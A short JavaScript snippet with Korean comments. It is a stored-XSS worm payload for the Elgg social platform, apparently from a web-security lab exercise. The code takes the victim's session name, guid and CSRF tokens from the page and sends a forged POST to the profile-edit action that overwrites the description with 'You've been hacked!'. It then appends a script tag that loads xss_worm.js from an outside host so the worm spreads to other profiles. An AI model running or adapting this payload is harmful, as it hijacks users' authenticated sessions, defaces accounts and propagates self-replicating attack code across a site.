// 피해자의 프로필을 수정하는 코드
var userName="&name="+elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
var desc = encodeURIComponent("You've been hacked!"); // 감염된 프로필에 입력될 내용
var content= "description=" + desc + userName + guid + ts + token; // 요청을 보내는 내용 구성
var sendurl = "/action/profile/edit"; // 프로필 수정을 위한 URL
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST", sendurl, true);
Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
Ajax.send(content);

// 웜을 다른 프로필에 복사하여 전파하는 코드
var wormScript = document.createElement('script');
wormScript.src = 'http://www.example.com/xss_worm.js'; // 웜 스크립트의 URL을 여기에 입력
document.body.appendChild(wormScript);
